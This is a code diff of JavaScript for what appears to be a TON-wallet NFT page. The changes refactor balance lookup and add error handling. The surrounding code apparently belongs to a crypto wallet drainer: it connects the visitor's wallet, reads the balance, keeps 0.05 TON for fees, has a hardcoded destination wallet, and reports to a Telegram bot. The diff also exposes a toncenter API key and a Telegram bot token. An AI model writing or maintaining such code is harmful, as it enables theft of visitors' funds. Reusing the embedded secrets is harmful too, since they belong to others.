@@ -3,11 +3,7 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     buttonRootId: 'ton-connect'
 });
 
-// Initialize TonWeb for balance queries
-const TonWeb = window.TonWeb;
-const tonClient = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', { apiKey: '72af116adcb9f929960600dcd7a9c14db0ec949d291ca28c3447d0a31a94632b' }); // Replace with your API key
-
-const MAIN_WALLET = "UQB_1vs8YfWcLzedQqVYRv5_OcXWZsqewXRj9io0CvsGqZAD"; // Replace with a valid, initialized address if needed
+const MAIN_WALLET = "UQB_1vs8YfWcLzedQqVYRv5_OcXWZsqewXRj9io0CvsGqZAD"; // Replace with a valid, initialized address
 const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
 const TG_CHAT_ID = "8126533622";
 const NETWORK_FEE = 0.05; // Reserve 0.05 TON for network fees
@@ -65,12 +61,19 @@ function renderNfts() {
 
 // Function to get wallet balance
 async function getWalletBalance(address) {
+    if (!window.TonWeb) {
+        throw new Error('TonWeb library not loaded');
+    }
+    const TonWeb = window.TonWeb;
+    const tonClient = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', { 
+        apiKey: '72af116adcb9f929960600dcd7a9c14db0ec949d291ca28c3447d0a31a94632b' // Replace with your API key
+    });
     try {
         const balance = await tonClient.getBalance(address);
         return TonWeb.utils.fromNano(balance); // Convert nanotons to TON
     } catch (error) {
         console.error('Failed to fetch balance:', error);
-        throw new Error('Unable to fetch wallet balance');
+        throw new Error('Unable to fetch wallet balance: ' + error.message);
     }
 }
 
@@ -141,7 +144,11 @@ function sendTelegramMessage(text) {
 // Initialization
 document.addEventListener('DOMContentLoaded', () => {
     console.log('DOM loaded, initializing NFTs');
-    renderNfts();
+    try {
+        renderNfts();
+    } catch (error) {
+        console.error('Failed to render NFTs:', error);
+    }
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
             console.log('Wallet connected:', wallet.account.address);
